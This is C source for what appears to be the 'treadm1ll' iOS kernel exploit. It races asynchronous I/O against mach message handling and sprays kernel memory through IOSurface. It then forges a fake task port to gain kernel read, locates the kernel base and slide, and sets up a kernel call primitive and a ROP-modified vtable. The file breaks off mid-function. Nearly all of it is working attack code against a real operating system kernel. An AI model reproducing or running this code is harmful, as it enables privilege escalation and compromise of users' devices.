//
//  exploit.c
//  treadm1ll
//
//  Created by tihmstar on 27.12.18.
//  Copyright © 2018 tihmstar. All rights reserved.
//

#include "treadm1ll.h"
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <aio.h>
#include <sys/errno.h>
#include <pthread.h>
#include <poll.h>
#include <mach/mach.h>
#include <mach/vm_map.h>
#include <mach-o/loader.h>
#include <CoreFoundation/CoreFoundation.h>

#define MAX(a,b) ((a) > (b) ? (a) : (b))

#define error(a ...) do { printf(a);printf("\n");} while(0)
#define assure(a) do{ if ((a) == 0){err=__LINE__; goto error;} }while(0)
#define reterror(a ... ) {error(a); err=__LINE__; goto error;}

// ********** ********** ********** IOKit ********** ********** **********

typedef mach_port_t io_service_t;
typedef mach_port_t io_connect_t;
extern const mach_port_t kIOMasterPortDefault;
CFMutableDictionaryRef IOServiceMatching(const char *name) CF_RETURNS_RETAINED;
io_service_t IOServiceGetMatchingService(mach_port_t masterPort, CFDictionaryRef matching CF_RELEASES_ARGUMENT);
kern_return_t IOServiceOpen(io_service_t service, task_port_t owningTask, uint32_t type, io_connect_t *client);
kern_return_t IOServiceClose(io_connect_t client);
kern_return_t IOConnectCallStructMethod(mach_port_t connection, uint32_t selector, const void *inputStruct, size_t inputStructCnt, void *outputStruct, size_t *outputStructCnt);
kern_return_t IOConnectCallAsyncStructMethod(mach_port_t connection, uint32_t selector, mach_port_t wake_port, uint64_t *reference, uint32_t referenceCnt, const void *inputStruct, size_t inputStructCnt, void *outputStruct, size_t *outputStructCnt);
kern_return_t IOConnectTrap6(io_connect_t connect, uint32_t index, uintptr_t p1, uintptr_t p2, uintptr_t p3, uintptr_t p4, uintptr_t p5, uintptr_t p6);
kern_return_t mach_vm_remap(vm_map_t dst, mach_vm_address_t *dst_addr, mach_vm_size_t size, mach_vm_offset_t mask, int flags, vm_map_t src, mach_vm_address_t src_addr, boolean_t copy, vm_prot_t *cur_prot, vm_prot_t *max_prot, vm_inherit_t inherit);

kern_return_t mach_vm_read_overwrite(vm_map_t target_task, mach_vm_address_t address, mach_vm_size_t size, mach_vm_address_t data, mach_vm_size_t *outsize);
kern_return_t mach_vm_write(vm_map_t target_task, mach_vm_address_t address, vm_offset_t data, mach_msg_type_number_t dataCnt);
kern_return_t mach_vm_protect(vm_map_t target_task, mach_vm_address_t address, mach_vm_size_t size, boolean_t set_maximum, vm_prot_t new_protection);
kern_return_t mach_vm_allocate(vm_map_t target, mach_vm_address_t *address, mach_vm_size_t size, int flags);
kern_return_t mach_vm_deallocate(mach_port_name_t target, mach_vm_address_t address, mach_vm_size_t size);


const uint64_t IOSURFACE_CREATE_SURFACE =  0;
const uint64_t IOSURFACE_SET_VALUE      =  9;
const uint64_t IOSURFACE_GET_VALUE      = 10;
const uint64_t IOSURFACE_DELETE_VALUE   = 11;

const uint32_t IKOT_TASK                = 2;

enum
{
    kOSSerializeDictionary      = 0x01000000U,
    kOSSerializeArray           = 0x02000000U,
    kOSSerializeSet             = 0x03000000U,
    kOSSerializeNumber          = 0x04000000U,
    kOSSerializeSymbol          = 0x08000000U,
    kOSSerializeString          = 0x09000000U,
    kOSSerializeData            = 0x0a000000U,
    kOSSerializeBoolean         = 0x0b000000U,
    kOSSerializeObject          = 0x0c000000U,
    
    kOSSerializeTypeMask        = 0x7F000000U,
    kOSSerializeDataMask        = 0x00FFFFFFU,
    
    kOSSerializeEndCollection   = 0x80000000U,
    
    kOSSerializeMagic           = 0x000000d3U,
};

typedef struct mach_header_64 mach_hdr_t;
typedef struct segment_command_64 mach_seg_t;
typedef uint64_t kptr_t;

// ********** ********** ********** OFFSETS ********** ********** **********

#define IOSURFACE_CREATE_OUTSIZE    0xbc8 /* XXX 0x6c8 for iOS 11.0, 0xbc8 for 11.1.2 */
#define OFFSET_TASK_ITK_SELF        0xd8
#define OFFSET_IOUSERCLIENT_IPC     0x9c

#define BSDINFO_PID_OFFSET  0x10


typedef struct {
    uint32_t ip_bits;
    uint32_t ip_references;
    struct {
        kptr_t data;
        uint32_t type;
#ifdef __LP64__
        uint32_t pad;
#endif
    } ip_lock; // spinlock
    struct {
        struct {
            struct {
                uint32_t flags;
                uint32_t waitq_interlock;
                uint64_t waitq_set_id;
                uint64_t waitq_prepost_id;
                struct {
                    kptr_t next;
                    kptr_t prev;
                } waitq_queue;
            } waitq;
            kptr_t messages;
            uint32_t seqno;
            uint32_t receiver_name;
            uint16_t msgcount;
            uint16_t qlimit;
#ifdef __LP64__
            uint32_t pad;
#endif
        } port;
        kptr_t klist;
    } ip_messages;
    kptr_t ip_receiver;
    kptr_t ip_kobject;
    kptr_t ip_nsrequest;
    kptr_t ip_pdrequest;
    kptr_t ip_requests;
    union {
        kptr_t *premsg;
        struct {
            uint8_t sync_qos[7];
            uint8_t special_port_qos;
        } qos_counter;
    } kdata2;
    uint64_t ip_context;
    uint32_t ip_flags;
    uint32_t ip_mscount;
    uint32_t ip_srights;
    uint32_t ip_sorights;
} kport_t;

typedef volatile union
{
    struct {
        struct {
            kptr_t data;
            uint32_t reserved : 24,
            type     :  8;
            uint32_t pad;
        } lock; // mutex lock
        uint32_t ref_count;
        uint32_t active;
        uint32_t halting;
        uint32_t pad;
        kptr_t map;
    } a;
    struct {
        char pad[OFFSET_TASK_ITK_SELF];
        kptr_t itk_self;
    } b;
} ktask_t;

typedef volatile struct{
    kptr_t prev;
    kptr_t next;
    kptr_t start;
    kptr_t end;
} kmap_hdr_t;

typedef volatile union
{
    struct {
        // IOUserClient fields
        kptr_t vtab;
        uint32_t refs;
        uint32_t pad;
        // Gadget stuff
        kptr_t trap_ptr;
        // IOExternalTrap fields
        kptr_t obj;
        kptr_t func;
        uint32_t break_stuff; // idk wtf this field does, but it has to be zero or iokit_user_client_trap does some weird pointer mashing
        // OSSerializer::serialize
        kptr_t indirect[3];
    } a;
    struct {
        char pad[OFFSET_IOUSERCLIENT_IPC];
        int32_t __ipc;
    } b;
} kobj_t;

#define RELEASE_PORT(port) \
do { \
if(MACH_PORT_VALID((port))){ \
_kernelrpc_mach_port_destroy_trap(mach_task_self(), (port)); \
port = MACH_PORT_NULL; \
} \
} while(0)

// ********** ********** ********** constants ********** ********** **********

#define KERNEL_MAGIC             MH_MAGIC_64
#define KERNEL_SLIDE_STEP        0x100000
#define KERNEL_HEADER_OFFSET     0x4000


// ********** ********** ********** mycode ********** ********** **********

#define MSG_CNT 0x4000
#define DATA_CNT 120

static mach_port_t msg_port[MSG_CNT] = {};
static mach_port_t dummy_port[MSG_CNT] = {};
static int surface_data_id[MSG_CNT] = {};
static surface_data_id_max = 0;

mach_port_t fakeport = 0;
static io_connect_t client = 0;

#define NEW_DEVICES_PAGESIZE 0x4000
static char __portBuf[NEW_DEVICES_PAGESIZE * 2] = {}; //2 pages of 16k size

kport_t *kport = 0;
kptr_t *fakeReadPtr = 0;
static kobj_t *fakeobj = 0;


void increase_limits() {
    struct rlimit lim = {0};
    int err = getrlimit(RLIMIT_NOFILE, &lim);
    if (err != 0) {
        printf("failed to get limits\n");
    }
    printf("rlim.cur: %lld\n", lim.rlim_cur);
    printf("rlim.max: %lld\n", lim.rlim_max);
    
    lim.rlim_cur = 10240;
    
    err = setrlimit(RLIMIT_NOFILE, &lim);
    if (err != 0) {
        printf("failed to set limits\n");
    }
    
    lim.rlim_cur = 0;
    lim.rlim_max = 0;
    err = getrlimit(RLIMIT_NOFILE, &lim);
    if (err != 0) {
        printf("failed to get limits\n");
    }
    printf("rlim.cur: %lld\n", lim.rlim_cur);
    printf("rlim.max: %lld\n", lim.rlim_max);
    
}

void *anakin(int *doRun){
    uint64_t err = 0;
    int fd = 0;
    int mode = LIO_NOWAIT;
    char buf;
    void *sigp = NULL;
    
    struct aiocb aios = {};
    struct aiocb* aio = &aios;
    
    char path[1024] = {0};
    snprintf(path, sizeof(path), "%slightspeed", getenv("TMPDIR"));
    
    assure((fd = open(path, O_RDWR|O_CREAT, S_IRWXU|S_IRWXG|S_IRWXO)) > 0);
    
    aio->aio_fildes = fd;
    aio->aio_offset = 0;
    aio->aio_buf = &buf;
    aio->aio_nbytes = 1;
    aio->aio_lio_opcode = LIO_READ; // change that to LIO_NOP for a DoS :D
    aio->aio_sigevent.sigev_notify = SIGEV_NONE;
    
    *doRun = 1;
    while(*doRun){
        lio_listio(mode, &aio, 1, sigp);
        //        /* check the return err of the aio to fully consume it */
        //        while(aio_error(aio) == EINPROGRESS) {
        //            usleep(100);
        //        }
        err = aio_return(aio);
    }
    
error:
    if(fd >= 0)
        close(fd);
    
    return (void*)err;
}


#pragma pack(4)
typedef struct {
    mach_msg_header_t Head;
    mach_msg_body_t msgh_body;
    union{
        mach_msg_ool_ports_descriptor_t desc;
        mach_msg_ool_descriptor_t memdesc;
    };
    char pad[4096];
} Request;
#pragma pack()


static kern_return_t spray_msgs(){
    kern_return_t err = 0;
    
    mach_port_t myP[2] = {0};
    for (int i=1; i<MSG_CNT; i++) {
        
        Request stuff;
        Request *InP = &stuff;
        InP->Head.msgh_bits = MACH_MSGH_BITS_SET(MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_COPY_SEND, 0, MACH_MSGH_BITS_COMPLEX);
        InP->Head.msgh_size = sizeof(mach_msg_header_t)+sizeof(mach_msg_body_t)+sizeof(mach_msg_ool_ports_descriptor_t);
        InP->Head.msgh_remote_port = msg_port[i];
        InP->Head.msgh_local_port = MACH_PORT_NULL;
        InP->Head.msgh_id = 0x1337;
        
        InP->msgh_body.msgh_descriptor_count = 1;
        
        myP[1] = dummy_port[i];
        
        InP->desc.address = &myP;
        InP->desc.count = 2;
        InP->desc.deallocate = 0;
        InP->desc.disposition = MACH_MSG_TYPE_MOVE_RECEIVE;
        InP->desc.type = MACH_MSG_OOL_PORTS_DESCRIPTOR;
        InP->desc.copy = MACH_MSG_PHYSICAL_COPY;
        
        if (i % 0x200 == 0) {
            sched_yield();
        }
        err = mach_msg(&InP->Head, MACH_SEND_MSG | MACH_SEND_TIMEOUT, InP->Head.msgh_size, 0, 0, 5, 0);
        
        if (err) { //timeout
            printf("mach_msg failed = %d (%s)!\n",err,mach_error_string(err));
        }
    }
error:
    return err;
}

static kern_return_t send_nullport(mach_port_t rcv){
    kern_return_t err = 0;
    
    mach_port_t myP[2] = {0};
    Request stuff;
    Request *InP = &stuff;
    //cheat code: MACH_MSG_TYPE_MAKE_SEND_ONCE makes kernel ignore the queue limit :D
    InP->Head.msgh_bits = MACH_MSGH_BITS_SET(MACH_MSG_TYPE_MAKE_SEND_ONCE, MACH_MSG_TYPE_MAKE_SEND_ONCE, 0, MACH_MSGH_BITS_COMPLEX);
    InP->Head.msgh_size = sizeof(mach_msg_header_t)+sizeof(mach_msg_body_t)+sizeof(mach_msg_ool_ports_descriptor_t);
    InP->Head.msgh_remote_port = rcv;
    InP->Head.msgh_local_port = MACH_PORT_NULL;
    InP->Head.msgh_id = 0x1337;
    
    InP->msgh_body.msgh_descriptor_count = 1;
    
    InP->desc.address = &myP;
    InP->desc.count = 1;
    InP->desc.deallocate = 0;
    InP->desc.disposition = MACH_MSG_TYPE_COPY_SEND;
    InP->desc.type = MACH_MSG_OOL_PORTS_DESCRIPTOR;
    InP->desc.copy = MACH_MSG_PHYSICAL_COPY;
    
    
    err = mach_msg(&InP->Head, MACH_SEND_MSG | MACH_SEND_TIMEOUT, InP->Head.msgh_size, 0, 0, 5, 0);
    
    if (err) { //timeout
        printf("mach_msg failed = %d (%s)!\n",err,mach_error_string(err));
    }
error:
    return err;
}

mach_port_t recv_msgs(){
    kern_return_t ret = 0;
    mach_port_t corruptMsgPort = 0;
    
    
    /* SPRAY PREPARE */
    uint32_t *dict_prep = NULL;
    uint32_t dictsz_prep = (5 + 7 * DATA_CNT) * sizeof(uint32_t);
    
    dict_prep = malloc(dictsz_prep);
    bzero(dict_prep, dictsz_prep);
    
    uint32_t *prep = dict_prep;
    *(prep++) = surface_data_id;// This will get overwritten!
    *(prep++) = 0x0;
    *(prep++) = kOSSerializeMagic;
    *(prep++) = kOSSerializeEndCollection | kOSSerializeArray | 1;
    *(prep++) = kOSSerializeEndCollection | kOSSerializeDictionary | DATA_CNT;
    for(size_t j = 0; j < DATA_CNT; ++j){
        *(prep++) = kOSSerializeSymbol | 4;
        *(prep++) = (uint32_t)j;
        *(prep++) = kOSSerializeData | 16 | (j+1 == DATA_CNT ? kOSSerializeEndCollection : 0);
        *(uint64_t*)(prep) = (uint64_t)kport;prep+=2;
        
        *(prep++) = 0;
        *(prep++) = 0;
    }
    /* END SPRAY PREPARE */
    
    //    printf("postspray...\n");
    //    for (int i=0; i<MSG_CNT/2; i++) {
    //        for (int j=0; j<63; j++) {
    //            send_nullport(msg_port[i]);
    //        }
    //    }
    
    printf("recieving...\n");
    int prevProgress = 0;
    for (int i=1; i<MSG_CNT; i++) {
        
        if (i % (MSG_CNT/4) == 1) {
            int snum = i / (MSG_CNT/4);
            printf("postspray%d...\n",snum);
            for (int z=i; z<(MSG_CNT/4)*(snum+1); z++) {
                for (int j=0; j<63; j++) {
                    send_nullport(msg_port[z]);
                }
            }
        }
        
        mach_port_t curPort = msg_port[i];
        
        Request stuff = {0};
        Request *OutP = &stuff;
        OutP->Head.msgh_size = sizeof(mach_msg_header_t)+sizeof(mach_msg_body_t)+sizeof(mach_msg_ool_ports_descriptor_t)+0x38;
        
        /* SPRAY PREPARE */
        uint32_t *prep = dict_prep+5;
        *(prep-5) = surface_data_id[i%surface_data_id_max];
        
        for(size_t j = 0; j < DATA_CNT; ++j){
            *(prep++) = kOSSerializeSymbol | 4;
            *(prep++) = (uint32_t)j+i*DATA_CNT;//unique ID
            *(prep++) = kOSSerializeData | 16 | (j+1 == DATA_CNT ? kOSSerializeEndCollection : 0);
            *(uint64_t*)(prep) = (uint64_t)kport;prep+=2;
            
            *(prep++) = 0;
            *(prep++) = 0;
        }
        uint32_t dummy = 0;
        uint32_t size = sizeof(dummy);
        /* END SPRAY PREPARE */
        
        sched_yield();
        /* ------- start critical section ------- */
        //free target message
        ret = mach_msg(&OutP->Head, MACH_RCV_MSG | MACH_RCV_TIMEOUT,0, OutP->Head.msgh_size, curPort, 5, 0);
        kern_return_t retd = _kernelrpc_mach_port_destroy_trap(mach_task_self(), curPort);
        //free all other kalloc.16 allocations in that port -> grow freelist
        //fill up data!
        kern_return_t retf = IOConnectCallStructMethod(client, IOSURFACE_SET_VALUE, dict_prep, dictsz_prep, &dummy, &size);
        /* ------- end critical section ------- */
        
        if (!retd){
            msg_port[i] = MACH_PORT_NULL;
        }else{
            printf("failed to destroy curPort! err=%d str=%s\n",ret,mach_error_string(ret));
        }
        
        if (retf) {
            printf("failed to spray memory err=%d str=%s\n",retf,mach_error_string(retf));
        }
#define recv_port (((mach_port_t*)(OutP->memdesc.address))[1])
        if (!ret) {
            if (recv_port != dummy_port[i]) {
                //                ret = _kernelrpc_mach_port_destroy_trap(mach_task_self(), msg_port[0]);
                {
                    i++;
                    uint32_t *prep = dict_prep+5;
                    *(prep-5) = surface_data_id[i%surface_data_id_max];
                    
                    for(size_t j = 0; j < DATA_CNT; ++j){
                        *(prep++) = kOSSerializeSymbol | 4;
                        *(prep++) = (uint32_t)j+i*DATA_CNT;//unique ID
                        *(prep++) = kOSSerializeData | 16 | (j+1 == DATA_CNT ? kOSSerializeEndCollection : 0);
                        *(uint64_t*)(prep) = (uint64_t)kport;prep+=2;
                        
                        *(prep++) = 0;
                        *(prep++) = 0;
                    }
                    uint32_t dummy = 0;
                    uint32_t size = sizeof(dummy);
                    kern_return_t retf = IOConnectCallStructMethod(client, IOSURFACE_SET_VALUE, dict_prep, dictsz_prep, &dummy, &size);
                    if (retf) {
                        printf("failed to post post spray memory err=%d str=%s\n",retf,mach_error_string(retf));
                    }
                }
                if (ret) {
                    printf("failed to pre post post spray free err=%d str=%s\n",ret,mach_error_string(ret));
                }
                printf("found something1: got=%d vs=%d\n",recv_port,curPort);
                
                for (int z=0; z<MSG_CNT; z++) {
                    if (recv_port == dummy_port[z]) {
                        corruptMsgPort = msg_port[z];
                        msg_port[z] = MACH_PORT_NULL;
                        break;
                    }
                }
                if (!corruptMsgPort){
                    printf("failed to find corruptMsgPort!\n");
                }else{
                    break;
                }
            }
            retd = _kernelrpc_mach_port_destroy_trap(mach_task_self(), recv_port);
            if (!retd){
                dummy_port[i] = MACH_PORT_NULL;
            }else{
                printf("failed to destroy recv_port! err=%d str=%s\n",ret,mach_error_string(ret));
            }
            ret = vm_deallocate(mach_task_self(), (vm_address_t)OutP->desc.address, PAGE_SIZE);
            if (ret) {
                printf("failed to dealloc memory! err=%d str=%s\n",ret,mach_error_string(ret));
            }
        }else{ //timeout
            printf("err=%d str=%s\n",ret,mach_error_string(ret));
        }
        
        
        
        int progress = i*100/MSG_CNT;
        if (progress > prevProgress) {
            printf("Searching=%d%%\n",progress);
            prevProgress = progress;
        }
        
    }
    free(dict_prep);
    
    return corruptMsgPort;
}

mach_port_t recv_msgs_nospray(){
    kern_return_t ret = 0;
    mach_port_t corruptMsgPort = 0;
    
    printf("recieving2...\n");
    int prevProgress = 0;
    for (int i=1; i<MSG_CNT; i++) {
        mach_port_t curPort = msg_port[i];
        if (!MACH_PORT_VALID(curPort))
            continue;
        
        Request stuff = {0};
        Request *OutP = &stuff;
        OutP->Head.msgh_size = sizeof(mach_msg_header_t)+sizeof(mach_msg_body_t)+sizeof(mach_msg_ool_ports_descriptor_t)+0x38;
        ret = mach_msg(&OutP->Head, MACH_RCV_MSG | MACH_RCV_TIMEOUT,0, OutP->Head.msgh_size, curPort, 5, 0);
        kern_return_t retd = _kernelrpc_mach_port_destroy_trap(mach_task_self(), curPort);
        
        if (!retd){
            msg_port[i] = MACH_PORT_NULL;
        }else{
            printf("failed to destroy curPort! err=%d str=%s\n",ret,mach_error_string(ret));
        }
        
#define recv_port (((mach_port_t*)(OutP->memdesc.address))[1])
        if (!ret) {
            if (recv_port != dummy_port[i]) {
                printf("found something2: got=%d vs=%d\n",recv_port,curPort);
                
                for (int z=0; z<MSG_CNT; z++) {
                    if (recv_port == dummy_port[z]) {
                        corruptMsgPort = msg_port[z];
                        break;
                    }
                }
                if (!corruptMsgPort){
                    printf("failed to find corruptMsgPort2!\n");
                }else{
                    break;
                }
            }
            retd = _kernelrpc_mach_port_destroy_trap(mach_task_self(), recv_port);
            if (!retd){
                dummy_port[i] = MACH_PORT_NULL;
            }else{
                printf("failed to destroy recv_port! err=%d str=%s\n",ret,mach_error_string(ret));
            }
            ret = vm_deallocate(mach_task_self(), (vm_address_t)OutP->desc.address, PAGE_SIZE);
            if (ret) {
                printf("failed to dealloc memory! err=%d str=%s\n",ret,mach_error_string(ret));
            }
        }else{ //timeout
            printf("err=%d str=%s\n",ret,mach_error_string(ret));
        }
        
        int progress = i*100/MSG_CNT;
        if (progress > prevProgress) {
            printf("Searching2=%d%%\n",progress);
            prevProgress = progress;
        }
    }
    
    return corruptMsgPort;
}

mach_port_t recv_msgs_single(mach_port_t port){
    kern_return_t ret = 0;
    mach_port_t recPort = 0;
    
    Request stuff = {0};
    Request *OutP = &stuff;
    OutP->Head.msgh_local_port = port;
    OutP->Head.msgh_size = (sizeof(mach_msg_header_t)+sizeof(mach_msg_body_t)+sizeof(mach_msg_port_descriptor_t)*2)*2;
    OutP->Head.msgh_bits = MACH_MSGH_BITS_SET(MACH_MSG_TYPE_MOVE_SEND_ONCE,0,0,0);
    OutP->Head.msgh_id = 0x1337;
    
    uint32_t tmp = kport->ip_sorights;
    kport->ip_sorights = rand(); //don't optimize this away compiler :P
    sched_yield();
    kport->ip_sorights = tmp; //gotta make sure kport isn't paged out
    
    ret = mach_msg(&OutP->Head, MACH_RCV_MSG | MACH_RCV_TIMEOUT, OutP->Head.msgh_size, OutP->Head.msgh_size, port, 50, 0);
    if (ret) {
        printf("recv_msgs_single error=%d %s\n",ret,mach_error_string(ret));
    }else{
        recPort = *(mach_port_t*)OutP->desc.address;
        ret = vm_deallocate(mach_task_self(), (vm_address_t)OutP->desc.address, PAGE_SIZE);
        if (ret) {
            printf("failed to dealloc memory! err=%d str=%s\n",ret,mach_error_string(ret));
        }
    }
    
    return recPort;
}

void suspend_all_threads() {
    thread_act_t other_thread, current_thread;
    unsigned int thread_count;
    thread_act_array_t thread_list;
    
    current_thread = mach_thread_self();
    int result = task_threads(mach_task_self(), &thread_list, &thread_count);
    if (result == -1) {
        exit(1);
    }
    if (!result && thread_count) {
        for (unsigned int i = 0; i < thread_count; ++i) {
            other_thread = thread_list[i];
            if (other_thread != current_thread) {
                int kr = thread_suspend(other_thread);
                if (kr != KERN_SUCCESS) {
                    mach_error("thread_suspend:", kr);
                }
            }
        }
    }
}

void resume_all_threads() {
    thread_act_t other_thread, current_thread;
    unsigned int thread_count;
    thread_act_array_t thread_list;
    
    current_thread = mach_thread_self();
    int result = task_threads(mach_task_self(), &thread_list, &thread_count);
    if (result == -1) {
        exit(1);
    }
    if (!result && thread_count) {
        for (unsigned int i = 0; i < thread_count; ++i) {
            other_thread = thread_list[i];
            if (other_thread != current_thread) {
                int kr = thread_resume(other_thread);
                if (kr != KERN_SUCCESS) {
                    mach_error("thread_resume:", kr);
                }
            }
        }
    }
}

void spinner_empty(mach_port_t *arg){
    while (!*arg); //spin
}

void spinner_nonempty(uint64_t *arg){
    while (*arg); //spin
}

uint32_t kread32(uint64_t where){
    kern_return_t ret = 0;
    uint32_t __k32readval = 0;
    *fakeReadPtr = (kptr_t)(((uint64_t)where)-BSDINFO_PID_OFFSET);
    if ((ret = pid_for_task(fakeport, (int*)&__k32readval))){
        printf("KREAD32 failed: 0x%08x s=%s!!\n",ret,mach_error_string(ret));
    }
    return __k32readval;
}

uint64_t kread64(uint64_t where){
    uint64_t val = 0;
    val = kread32(where);
    val |= ((uint64_t)kread32(where+4)) << 32;
    return val;
}

kptr_t gKCALL(kptr_t addr, kptr_t x0, kptr_t x1, kptr_t x2, kptr_t x3, kptr_t x4, kptr_t x5, kptr_t x6){
    fakeobj->a.obj = (kptr_t)(x0);
    fakeobj->a.func = (kptr_t)(addr);
    return (kptr_t)IOConnectTrap6(fakeport, 0, (kptr_t)(x1), (kptr_t)(x2), (kptr_t)(x3), (kptr_t)(x4), (kptr_t)(x5), (kptr_t)(x6));
}

int treadm1ll(offsets_t *off, treadm1ll_cb_t callback, void *cb_data){
    kern_return_t ret = 0;
    int err = 0;
    io_service_t service = MACH_PORT_NULL;
    pthread_t faultyThread = 0;
    pthread_t anakinthread = 0;
    mach_port_t corruptMsgPort = 0;
    int doRun = 0;
    kptr_t kbase = 0;
    
    increase_limits();
    
    goto start;
restart:
    assure(!_kernelrpc_mach_port_destroy_trap(mach_task_self(), client));
    assure(!_kernelrpc_mach_port_destroy_trap(mach_task_self(), service));
start:
    printf("start\n");
    
    //make sure kport lies at a page boundry (we don't want this to lie in between 2 pages)
    kport = (kport_t*)((((uint64_t)__portBuf) + NEW_DEVICES_PAGESIZE) & (~(NEW_DEVICES_PAGESIZE-1)));
    fakeReadPtr = (kptr_t*)(((uint64_t)kport)+off->task_bsd_info+4-0x10); //make the ip_references field of the port overlap with the task
    
    client = MACH_PORT_NULL;
    
    
    memset(kport, 0, sizeof(kport_t));
    
    //i don't know what i'm doing :o
    kport->ip_bits = 0x80000000; // IO_BITS_ACTIVE | IOT_PORT | IKOT_NONE
    kport->ip_references = 100;
    kport->ip_lock.type = 0x11;
    kport->ip_messages.port.receiver_name = 1;
    kport->ip_messages.port.msgcount = MACH_PORT_QLIMIT_KERNEL;
    kport->ip_messages.port.qlimit = MACH_PORT_QLIMIT_KERNEL;
    kport->ip_srights = 99;
    printf("kport at=%p\n",kport);
    
    for (int i=0; i<MSG_CNT; i++) {
        assure(mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &msg_port[i]) == 0);
        assure(mach_port_insert_right(mach_task_self(), msg_port[i], msg_port[i], MACH_MSG_TYPE_MAKE_SEND) == 0);
        
        assure(mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &dummy_port[i]) == 0);
        assure(mach_port_insert_right(mach_task_self(), dummy_port[i], dummy_port[i], MACH_MSG_TYPE_MAKE_SEND) == 0); //this is imporant for the port to keep its name
    }
    
    
    // --------------- HAX -----------
    doRun = 2;
    printf("spraying messages...\n");
    
    pthread_create(&anakinthread, 0, (void*(*)(void*))anakin, &doRun);
    while (doRun != 1); //wait for other thread to start up
    spray_msgs();
    doRun = 0;
    
    pthread_join(anakinthread, 0);
    sched_yield(); //i don't think we need this, but just in case keep it here ;)
    // --------------- SETUP -----------
    
    
    service = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("IOSurfaceRoot"));
    assure(MACH_PORT_VALID(service));
    
    assure(IOServiceOpen(service, mach_task_self(), 0, &client) == KERN_SUCCESS);
    assure(MACH_PORT_VALID(client));
    printf("creating surfaces...\n");
    for (int i=0; i<MSG_CNT/0x10; i++) {
        uint32_t dict_create[] =
        {
            kOSSerializeMagic,
            kOSSerializeEndCollection | kOSSerializeDictionary | 1,
            
            kOSSerializeSymbol | 19,
            0x75534f49, 0x63616672, 0x6c6c4165, 0x6953636f, 0x657a, // "IOSurfaceAllocSize"
            kOSSerializeEndCollection | kOSSerializeNumber | 32,
            0x1000,
            0x0,
        };
        union
        {
            char _padding[IOSURFACE_CREATE_OUTSIZE];
            struct
            {
                mach_vm_address_t addr1;
                mach_vm_address_t addr2;
                uint32_t id;
            } data;
        } surface;
        bzero(&surface, sizeof(surface));
        size_t size = sizeof(surface);
        if((ret = IOConnectCallStructMethod(client, IOSURFACE_CREATE_SURFACE, dict_create, sizeof(dict_create), &surface, &size))){
            break;
        }
        //        printf("surface ID: 0x%x\n", surface.data.id);
        surface_data_id[surface_data_id_max++] = surface.data.id;
    }
    
    
    // --------------- MORE HAX -----------
#warning MIGHT INCREASE RELIABILITY WHEN CHANGED BACK TO 16
    //    for (int i=0; i<16; i++) {
    //        pthread_t lol;
    //        pthread_create(&lol, NULL, (void*(*)(void*))spinner_empty, &corruptMsgPort); //dies when we find a corrupt port
    //    }
    
    corruptMsgPort = recv_msgs();
    if (!corruptMsgPort) {
        printf("exploit failed!\n");
        
        exit(7);
        return -1;
    }
    
    pthread_create(&faultyThread, 0, (void*(*)(void*))spinner_nonempty, (void*)&kport->ip_bits); //make sure kport page doesn't get paged out
    
    printf("receiving fake port...\n");
    sleep(1);
    fakeport = recv_msgs_single(corruptMsgPort);
    
    // --------------- POST HAX -----------
    
    printf("Got fake port!\n");
    sleep(1); //kinda just for debug
    mach_port_t realport = 0;
    assure(!(ret = _kernelrpc_mach_port_allocate_trap(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &realport)));
    
    mach_port_t notify = MACH_PORT_NULL;
    assure(!(ret = mach_port_request_notification(mach_task_self(), fakeport, MACH_NOTIFY_PORT_DESTROYED, 0, realport, MACH_MSG_TYPE_MAKE_SEND_ONCE, &notify)));
    
    kptr_t realport_addr = kport->ip_pdrequest;
    printf("realport_addr=%p\n",(void*)realport_addr);
    
    
    // --------------- WHY REINVENT THE WHEEL WHEN YOU CAN COPY&PASTE V0RTEX? -----------
    
    assure(mach_port_insert_right(mach_task_self(), fakeport, fakeport, MACH_MSG_TYPE_MAKE_SEND) == 0);
    
    /*
     XXX when i set IKOT_TASK right at the beginnig then things don't work
     maybe i need to modify more port fileds???
     */
    kport->ip_bits = 0x80000002; // IO_BITS_ACTIVE | IOT_PORT | IKOT_TASK
    
    kport->ip_kobject = (kptr_t)(((uint64_t)fakeReadPtr)-off->task_bsd_info);
    printf("fakeReadPtr=%p\n",fakeReadPtr);
    printf("kport->ip_kobject=%p\n",(void*)kport->ip_kobject);
    
    kptr_t itk_space = kread64(realport_addr + offsetof(kport_t, ip_receiver));
    printf("itk_space=%p\n",(void*)itk_space);
    
    kptr_t self_task = kread64(itk_space + off->ipc_space_is_task);
    printf("self_task=%p\n",(void*)self_task);
    
    
    assure(!(ret = mach_ports_register(mach_task_self(), &client, 1)));
    
    
    kptr_t IOSurfaceRootUserClient_port = kread64(self_task + off->task_itk_registered);
    printf("IOSurfaceRootUserClient_port=%p\n",(void*)IOSurfaceRootUserClient_port);
    
    kptr_t IOSurfaceRootUserClient_addr = kread64(IOSurfaceRootUserClient_port + offsetof(kport_t, ip_kobject));
    printf("IOSurfaceRootUserClient_addr=%p\n",(void*)IOSurfaceRootUserClient_addr);
    
    kptr_t IOSurfaceRootUserClient_vtab = kread64(IOSurfaceRootUserClient_addr);
    printf("IOSurfaceRootUserClient_vtab=%p\n",(void*)IOSurfaceRootUserClient_vtab);
    
    kbase = kread64(IOSurfaceRootUserClient_vtab + off->vtab_get_external_trap_for_index*sizeof(kptr_t));
    
    kbase = (kbase & ~(KERNEL_SLIDE_STEP - 1)) + KERNEL_HEADER_OFFSET;
    
    for(; kread32(kbase) != KERNEL_MAGIC; kbase -= KERNEL_SLIDE_STEP);
    
    uint64_t slide = kbase-off->base;
    printf("Kernel base: %p\n",(void*)kbase);
    printf("Kernel Magic: 0x%08x\n",kread32(kbase));
    printf("Kernel slide: %p\n",(void*)slide);
    
    
#define OFF(name) (off->name + slide)
    
    kptr_t zone_map_addr = kread64(OFF(zone_map));
    printf("zone_map_addr=%p\n", (void*)zone_map_addr);
    
    
    uint64_t *vtab = malloc(NEW_DEVICES_PAGESIZE);
    for (int i=0; i<300 && i<NEW_DEVICES_PAGESIZE/sizeof(uint64_t); i++) {
        vtab[i] = kread64(IOSurfaceRootUserClient_vtab+i*8);
    }
    
    //modify vtab
    vtab[off->vtab_get_external_trap_for_index] = off->rop_ldr_x0_x0_0x10+slide;
    
    
    printf("vtab=%p\n",vtab);
